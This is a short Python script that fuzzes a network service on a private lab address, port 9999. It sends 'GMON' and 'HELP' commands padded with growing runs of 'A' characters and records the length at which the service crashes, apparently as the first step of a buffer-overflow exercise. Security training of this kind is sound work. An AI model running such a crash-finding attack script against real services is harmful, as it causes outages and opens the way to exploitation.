#!/usr/bin/python

import socket

ip = '192.168.56.103'
port = 9999
 
commands = ("GMON ./:/", "HELP ")
increment = 100
maxlen = 5000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
for cmd in commands:
  for i in range(increment, maxlen, increment):
    s.send(cmd + "A" * i)
    print("Testing %s with length %i" % (cmd, i))
    try:
      data = s.recv(1024)
    except Exception:
      print("Program crashed with command %s and length %i" % (cmd, i))
      exit(1)
    if not data:
      print("program crashed with command %s and length %i" % (cmd, i))
      exit(1)

